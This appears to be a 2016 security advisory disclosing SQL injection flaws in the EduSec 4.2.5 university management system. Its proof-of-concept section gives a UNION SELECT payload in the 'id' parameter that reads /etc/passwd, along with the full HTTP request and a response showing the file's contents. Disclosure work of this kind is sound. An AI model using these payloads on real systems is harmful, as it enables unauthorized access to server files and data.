@@ -1,0 +1,78 @@
+EduSec 4.2.5 Multiple SQL Injection Vulnerabilities
+
+
+Vendor: Rudra Softech
+Product web page: http://www.rudrasoftech.com
+Affected version: 4.2.5
+
+Summary: EduSec has a suite of selective modules specifically
+tailored to the requirements of education industry. EduSec is
+engineered and designed considering wide range of management
+functions within the university. With the use of EduSec, staff
+can be more accountable as it helps to know the performance of
+each department in just few seconds. Almost all departments within
+education industry (e. g. admission, administration, time table,
+examination, HR, finance etc) can be synchronized and accessed.
+EduSec helps to assign the responsibilities to employee staff
+and can reduce time wastage and can speed up the administrative
+functions. Core functions like admissions, library management,
+transport management, students’ attendance in short entire range
+of university functions can be well performed by EduSec.
+
+Desc: EduSec suffers from multiple SQL Injection vulnerabilities.
+Input passed via multiple 'id' GET parameters are not properly
+sanitised before being returned to the user or used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting 
+arbitrary SQL code.
+
+Tested on: MySQL/5.5.35-0ubuntu0.12.04.2
+           Apache/2.4.12 (Ubuntu)
+
+
+Vulnerability discovered by Bikramaditya Guha aka "PhoenixX"
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5326
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5326.php
+
+
+10.05.2016
+
+--
+
+
+Parameter: id (GET)
+POC URL: 
+http://localhost/student/stu-master/view?id=2%20UniOn%20SeleCt%201,load_file%28%27/etc/passwd%27%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--#guardians
+http://localhost/employee/emp-master/view?id=20%27
+
+
+Request:
+GET /student/stu-master/view?id=2%20UniOn%20SeleCt%201,load_file(%27/etc/passwd%27),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=r18cpflgekesdn8cam8c8jmf86; _csrf=0f8795c6671d0db724d513142cc81e5d3ca8b83c094b970242fda96899be8148a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22E-TdUjNTZVVugL36t2p-VcoC6MBR4hqq%22%3B%7D; language=32d49278f28c78229de164fe79dc13b6adb3c98af2d133240eb1ffc44771ad3da%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22en%22%3B%7D; isRTL=0fc3d58c320669b52dea022e5a3db09649641bfdd1cbba93929ce2932c57707aa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22isRTL%22%3Bi%3A1%3Bi%3A0%3B%7D
+Connection: close
+
+Response:
+HTTP/1.1 200 OK
+Date: Fri, 13 May 2016 08:35:05 GMT
+Server: Apache/2.4.12 (Ubuntu)
+<....snip>
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+.
+..
+...
+....
+.....
+......
